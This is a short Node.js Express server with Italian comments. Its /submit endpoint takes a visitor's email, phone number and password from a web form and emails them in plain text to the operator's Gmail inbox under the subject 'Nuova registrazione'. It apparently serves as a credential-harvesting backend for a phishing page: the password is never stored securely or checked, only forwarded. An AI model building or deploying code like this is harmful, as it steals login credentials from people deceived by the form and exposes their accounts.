const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");
const path = require("path");

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors()); // Permette le richieste da altri domini
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, "public")));

// Endpoint per ricevere i dati dal form
app.post("/submit", async (req, res) => {
  const { email, phone, password } = req.body;

  // Trasporto email sicuro (consigliato usare Gmail con "password app")
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: "tuaemail@gmail.com",
    to: "tuaemail@gmail.com",
    subject: "Nuova registrazione",
    text: `📩 Email: ${email}\n📞 Telefono: ${phone}\n🔐 Password: ${password}`,
  };

  try {
    await transporter.sendMail(mailOptions);
    res.status(200).send("Dati ricevuti.");
  } catch (err) {
    console.error("Errore invio email:", err);
    res.status(500).send("Errore nel server.");
  }
});

app.listen(PORT, () => {
  console.log(`Server attivo sulla porta ${PORT}`);
});
